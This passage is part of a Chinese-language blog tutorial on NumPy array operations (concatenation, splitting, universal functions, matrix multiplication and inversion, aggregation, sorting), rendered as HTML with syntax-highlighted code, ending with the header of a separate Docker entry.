class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">A = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">             [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">             </span><br><span class="line">--&gt; array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="comment"># 一个样本增加一个样本</span></span><br><span class="line">np.concatenate([A,A])</span><br><span class="line"><span class="comment"># 一个样本增加一个特征</span></span><br><span class="line">np.concatenate([A, A], axis=<span class="number">1</span>)     </span><br><span class="line">--&gt; array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>axis默认为0，表示竖着拼接；axis=1 表示沿着第二个维度进行拼接（横着拼接）</p></blockquote><h3 id="跨维度合并"><a href="#跨维度合并" class="headerlink" title="跨维度合并"></a>跨维度合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z = np.array([<span class="number">666</span>,<span class="number">666</span>,<span class="number">666</span>])</span><br><span class="line">A2 = np.concatenate([A, z.reshape(<span class="number">1</span>,-<span class="number">1</span>)])</span><br></pre></td></tr></table></figure><h3 id="垂直方向进行叠加"><a href="#垂直方向进行叠加" class="headerlink" title="垂直方向进行叠加"></a>垂直方向进行叠加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.vstack([A,z])</span><br><span class="line">--&gt; array([[  <span class="number">1</span>,   <span class="number">2</span>,   <span class="number">3</span>],</span><br><span class="line">       [  <span class="number">4</span>,   <span class="number">5</span>,   <span class="number">6</span>],</span><br><span class="line">       [<span class="number">666</span>, <span class="number">666</span>, <span class="number">666</span>]])</span><br></pre></td></tr></table></figure><h3 id="水平方向进行叠加"><a href="#水平方向进行叠加" class="headerlink" title="水平方向进行叠加"></a>水平方向进行叠加</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B = np.full((<span class="number">2</span>,<span class="number">2</span>), <span class="number">100</span>)</span><br><span class="line">--&gt;</span><br><span class="line">array([[<span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">       [<span class="number">100</span>, <span class="number">100</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">np.hstack([A, B])</span><br><span class="line">--&gt;</span><br><span class="line">array([[  <span class="number">1</span>,   <span class="number">2</span>,   <span class="number">3</span>, <span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">       [  <span class="number">4</span>,   <span class="number">5</span>,   <span class="number">6</span>, <span class="number">100</span>, <span class="number">100</span>]])</span><br></pre></td></tr></table></figure><h3 id="分割操作"><a href="#分割操作" class="headerlink" title="分割操作"></a>分割操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</span><br><span class="line">x1, x2, x3  = np.split(x, [<span class="number">3</span>,<span class="number">7</span>])</span><br><span class="line">(array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]), array([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]), array([<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]))</span><br></pre></td></tr></table></figure><h3 id="多维默认以行分割"><a href="#多维默认以行分割" class="headerlink" title="多维默认以行分割"></a>多维默认以行分割</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A1, A2 = np.split(A, [<span class="number">2</span>])</span><br><span class="line">(array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]]),</span><br><span class="line"> array([[ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]]))</span><br><span class="line">upper, lower = np.vsplit(A, [<span class="number">2</span>])</span><br></pre></td></tr></table></figure><h4 id="以列分割"><a href="#以列分割" class="headerlink" title="以列分割"></a>以列分割</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A1, A2 = np.split(A, [<span class="number">2</span>], axis=<span class="number">1</span>)</span><br><span class="line">(array([[ <span class="number">0</span>,  <span class="number">1</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">        [<span class="number">12</span>, <span class="number">13</span>]]),</span><br><span class="line"> array([[ <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">14</span>, <span class="number">15</span>]]))</span><br><span class="line">left, right = np.hsplit(A, [<span class="number">2</span>])</span><br></pre></td></tr></table></figure><h1 id="矩阵的运算"><a href="#矩阵的运算" class="headerlink" title="矩阵的运算"></a>矩阵的运算</h1><p>给定一个向量，让向量中每一个数乘以2</p><p><code>a = (0,1,2)</code></p><p><code>a*2 = (0,2,4)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">10</span></span><br><span class="line">L = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br></pre></td></tr></table></figure><p>方法1：list</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A = [2*e for e in L]</span><br><span class="line">--&gt;</span><br><span class="line">[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]</span><br></pre></td></tr></table></figure><p>方法2：numpy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">L = np.arange(n)</span><br><span class="line">A = np.array(e*<span class="number">2</span> <span class="keyword">for</span> e <span class="keyword">in</span> L) <span class="comment">#或者</span></span><br><span class="line">A = <span class="number">2</span> * L</span><br></pre></td></tr></table></figure><h2 id="Universal-Functions"><a href="#Universal-Functions" class="headerlink" title="Universal Functions"></a>Universal Functions</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = np.arange(<span class="number">1</span>,<span class="number">16</span>).reshape((<span class="number">3</span>,<span class="number">5</span>))</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">       [ <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运算+-*/(浮点除)//(整数除)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求余</span></span><br><span class="line">X % <span class="number">2</span></span><br><span class="line"><span class="comment"># 取倒数</span></span><br><span class="line"><span class="number">1</span> / X</span><br><span class="line">array([[<span class="number">1.</span>        , <span class="number">0.5</span>       , <span class="number">0.33333333</span>, <span class="number">0.25</span>      , <span class="number">0.2</span>       ],</span><br><span class="line">       [<span class="number">0.16666667</span>, <span class="number">0.14285714</span>, <span class="number">0.125</span>     , <span class="number">0.11111111</span>, <span class="number">0.1</span>       ],</span><br><span class="line">       [<span class="number">0.09090909</span>, <span class="number">0.08333333</span>, <span class="number">0.07692308</span>, <span class="number">0.07142857</span>, <span class="number">0.06666667</span>]])</span><br><span class="line"><span class="comment"># 取绝对值</span></span><br><span class="line">np.<span class="built_in">abs</span>(X)</span><br><span class="line"><span class="comment"># 取正弦函数cos，tan同</span></span><br><span class="line">np.sin(X)</span><br><span class="line"><span class="comment"># 取e的X方</span></span><br><span class="line">np.exp(X)</span><br><span class="line"><span class="comment"># 取3的X次方</span></span><br><span class="line">np.power(<span class="number">3</span>,X)</span><br><span class="line"><span class="comment"># 取log以e为底</span></span><br><span class="line">np.log(X)</span><br><span class="line"><span class="comment"># 取log以2为底</span></span><br></pre></td></tr></table></figure><h2 id="矩阵对应元素做运算"><a href="#矩阵对应元素做运算" class="headerlink" title="矩阵对应元素做运算"></a>矩阵对应元素做运算</h2><p>加减乘除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A = np.arange(<span class="number">4</span>).reshape(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">B = np.full((<span class="number">2</span>,<span class="number">2</span>),<span class="number">10</span>)</span><br><span class="line">A,B</span><br><span class="line">(array([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>]]),</span><br><span class="line"> array([[<span class="number">10</span>, <span class="number">10</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">10</span>]]))</span><br><span class="line">A * B</span><br><span class="line">array([[ <span class="number">0</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">30</span>]])</span><br></pre></td></tr></table></figure><h3 id="标准举证乘法"><a href="#标准举证乘法" class="headerlink" title="标准举证乘法"></a>标准举证乘法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A.dot(B)       </span><br><span class="line">array([[<span class="number">10</span>, <span class="number">10</span>],</span><br><span class="line">       [<span class="number">50</span>, <span class="number">50</span>]])</span><br></pre></td></tr></table></figure><h3 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A.T</span><br><span class="line">array([[0, 2],</span><br><span class="line">       [1, 3]])</span><br></pre></td></tr></table></figure><h2 id="向量和矩阵之间的运算"><a href="#向量和矩阵之间的运算" class="headerlink" title="向量和矩阵之间的运算"></a>向量和矩阵之间的运算</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v = np.array([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">v--&gt;array([<span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">A--&gt;</span><br><span class="line">(array([[<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">2</span>, <span class="number">3</span>]])</span><br></pre></td></tr></table></figure><h3 id="加法：向量和矩阵中的每个行做加法"><a href="#加法：向量和矩阵中的每个行做加法" class="headerlink" title="加法：向量和矩阵中的每个行做加法"></a>加法：向量和矩阵中的每个行做加法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v+A</span><br><span class="line">array([[<span class="number">1</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">5</span>]])</span><br><span class="line"><span class="comment">#等同</span></span><br><span class="line">np.vstack([v] * A.shape[<span class="number">0</span>]) +A</span><br></pre></td></tr></table></figure><h4 id="向量堆叠tile"><a href="#向量堆叠tile" class="headerlink" title="向量堆叠tile"></a>向量堆叠tile</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.tile(v,[<span class="number">2</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="乘法：矩阵的每个元素和向量每个元素相乘再相加"><a href="#乘法：矩阵的每个元素和向量每个元素相乘再相加" class="headerlink" title="乘法：矩阵的每个元素和向量每个元素相乘再相加"></a>乘法：矩阵的每个元素和向量每个元素相乘再相加</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v.dot(A)</span><br><span class="line">array([4, 7])</span><br><span class="line">A.dot(v) #将v转换2x1的矩阵</span><br><span class="line">array([2, 8])</span><br></pre></td></tr></table></figure><h2 id="矩阵的逆"><a href="#矩阵的逆" class="headerlink" title="矩阵的逆"></a>矩阵的逆</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">invA = np.linalg.inv(A)</span><br><span class="line">array([[-<span class="number">1.5</span>,  <span class="number">0.5</span>],</span><br><span class="line">       [ <span class="number">1.</span> ,  <span class="number">0.</span> ]])</span><br><span class="line">A.dot(invA) <span class="comment">#得到单位矩阵</span></span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>]])</span><br><span class="line">invA.dot(A)</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">1.</span>]])</span><br></pre></td></tr></table></figure><blockquote><p>矩阵一定要是方阵才有逆矩阵</p></blockquote><h3 id="伪逆矩阵"><a href="#伪逆矩阵" class="headerlink" title="伪逆矩阵"></a>伪逆矩阵</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">16</span>).reshape(<span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">np.linalg.pinv(x)</span><br><span class="line">array([[-<span class="number">1.35416667e-01</span>,  <span class="number">5.20833333e-02</span>],</span><br><span class="line">       [-<span class="number">1.01190476e-01</span>,  <span class="number">4.16666667e-02</span>],</span><br><span class="line">       [-<span class="number">6.69642857e-02</span>,  <span class="number">3.12500000e-02</span>],</span><br><span class="line">       [-<span class="number">3.27380952e-02</span>,  <span class="number">2.08333333e-02</span>],</span><br><span class="line">       [ <span class="number">1.48809524e-03</span>,  <span class="number">1.04166667e-02</span>],</span><br><span class="line">       [ <span class="number">3.57142857e-02</span>, -<span class="number">4.96086088e-18</span>],</span><br><span class="line">       [ <span class="number">6.99404762e-02</span>, -<span class="number">1.04166667e-02</span>],</span><br><span class="line">       [ <span class="number">1.04166667e-01</span>, -<span class="number">2.08333333e-02</span>]])</span><br><span class="line">x.dot(pinvx)</span><br><span class="line">array([[ <span class="number">1.00000000e+00</span>, -<span class="number">2.60208521e-16</span>],</span><br><span class="line">       [ <span class="number">9.71445147e-17</span>,  <span class="number">1.00000000e+00</span>]])</span><br></pre></td></tr></table></figure><h1 id="聚合操作"><a href="#聚合操作" class="headerlink" title="聚合操作"></a>聚合操作</h1><p>把一组值变成一个值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.arange(<span class="number">16</span>).reshape(<span class="number">4</span>,-<span class="number">1</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>]])</span><br><span class="line"><span class="comment"># 最大值</span></span><br><span class="line">np.<span class="built_in">max</span>(x)</span><br><span class="line"><span class="comment"># 最小值</span></span><br><span class="line">np.<span class="built_in">min</span>(x)</span><br><span class="line"><span class="comment"># 求乘积</span></span><br><span class="line">np.prod(x)</span><br><span class="line"><span class="comment"># 平均值</span></span><br><span class="line">np.mean(x)</span><br><span class="line"><span class="comment"># 中位数</span></span><br><span class="line">np.median(x)</span><br><span class="line"><span class="comment"># 方差</span></span><br><span class="line">np.var(x)</span><br><span class="line"><span class="comment"># 标准差</span></span><br><span class="line">np.std(x)</span><br></pre></td></tr></table></figure><h2 id="求和"><a href="#求和" class="headerlink" title="求和"></a>求和</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.sum(x)</span><br></pre></td></tr></table></figure><p>求每一列的和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.<span class="built_in">sum</span>(x, axis=<span class="number">0</span>) --&gt;</span><br><span class="line">array([<span class="number">24</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">36</span>])</span><br></pre></td></tr></table></figure><p>求每一行的和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.<span class="built_in">sum</span>(x, axis=<span class="number">1</span>) --&gt;</span><br><span class="line">array([ <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>])</span><br></pre></td></tr></table></figure><h2 id="百分位点求值"><a href="#百分位点求值" class="headerlink" title="百分位点求值"></a>百分位点求值</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">np.percentile(x,q=<span class="number">50</span>)</span><br><span class="line"><span class="number">7.5</span></span><br><span class="line"><span class="keyword">for</span> percent <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">75</span>,<span class="number">100</span>]:</span><br><span class="line">    <span class="built_in">print</span>(np.percentile(x,q=percent))</span><br><span class="line"><span class="number">0.0</span></span><br><span class="line"><span class="number">3.75</span></span><br><span class="line"><span class="number">7.5</span></span><br><span class="line"><span class="number">11.25</span></span><br><span class="line"><span class="number">15.0</span></span><br></pre></td></tr></table></figure><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new = np.random.normal(<span class="number">0</span>,<span class="number">1</span>, size=<span class="number">10</span>)</span><br><span class="line">np.<span class="built_in">min</span>(new)</span><br><span class="line">--&gt; -<span class="number">1.2581554274500057</span></span><br><span class="line">np.argmin(new)</span><br><span class="line">--&gt; <span class="number">1</span></span><br><span class="line">new[<span class="number">1</span>]</span><br><span class="line">--&gt; -<span class="number">1.2581554274500057</span></span><br></pre></td></tr></table></figure><h3 id="排序使用索引"><a href="#排序使用索引" class="headerlink" title="排序使用索引"></a>排序使用索引</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">16</span>)</span><br><span class="line">np.random.shuffle(x)</span><br><span class="line"><span class="comment"># 返回排序后结果</span></span><br><span class="line">np.sort(x)</span><br><span class="line"><span class="comment"># 将x排序</span></span><br><span class="line">x.sort()</span><br></pre></td></tr></table></figure><p>按照索引有序排列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.argsort(x)</span><br></pre></td></tr></table></figure><p>标定点（标定点前都比他小，后都比他大）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.partition(x,<span class="number">7</span>)</span><br><span class="line">array([ <span class="number">1</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">7</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">11</span>])</span><br><span class="line">np.argpartition(x,<span class="number">7</span>) 索引对应的值比<span class="number">7</span>小或者比<span class="number">7</span>大</span><br></pre></td></tr></table></figure><h3 id="矩阵排序"><a href="#矩阵排序" class="headerlink" title="矩阵排序"></a>矩阵排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#x = np.random.randint(16,size=(4,4))</span></span><br><span class="line">array([[ <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>],</span><br><span class="line">       [<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">9</span>, <span class="number">11</span>],</span><br><span class="line">       [ <span class="number">5</span>, <span class="number">10</span>,  <span class="number">8</span>,  <span class="number">7</span>],</span><br><span class="line">       [<span class="number">11</span>, <span class="number">11</span>,  <span class="number">0</span>,  <span class="number">6</span>]])</span><br><span class="line"><span class="comment">#沿着列排序（默认）</span></span><br><span class="line">np.sort(x, axis=<span class="number">1</span>)</span><br><span class="line">array([[ <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>],</span><br><span class="line">       [ <span class="number">2</span>,  <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">10</span>],</span><br><span class="line">       [ <span class="number">0</span>,  <span class="number">6</span>, <span class="number">11</span>, <span class="number">11</span>]])</span><br><span class="line">np.argsort(x, axis=<span class="number">1</span>)</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>]], dtype=int64)</span><br><span class="line"><span class="comment">#沿着行排序</span></span><br><span class="line">np.sort(x, axis=<span class="number">0</span>)</span><br><span class="line">array([[ <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>],</span><br><span class="line">       [ <span class="number">8</span>, <span class="number">10</span>,  <span class="number">8</span>,  <span class="number">7</span>],</span><br><span class="line">       [<span class="number">11</span>, <span class="number">10</span>,  <span class="number">9</span>, <span class="number">11</span>],</span><br><span class="line">       [<span class="number">13</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">14</span>]])</span><br><span class="line">np.argsort(x, axis=<span class="number">0</span>)</span><br><span class="line">array([[<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>]], dtype=int64)</span><br><span class="line">np.argpartition(x,<span class="number">2</span>,axis=<span class="number">1</span>)</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>]], dtype=int64)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker常用镜像</title>
      <link href="/p/54b756b4.html"/>
      <url>/p/54b756b4.html</url>
      
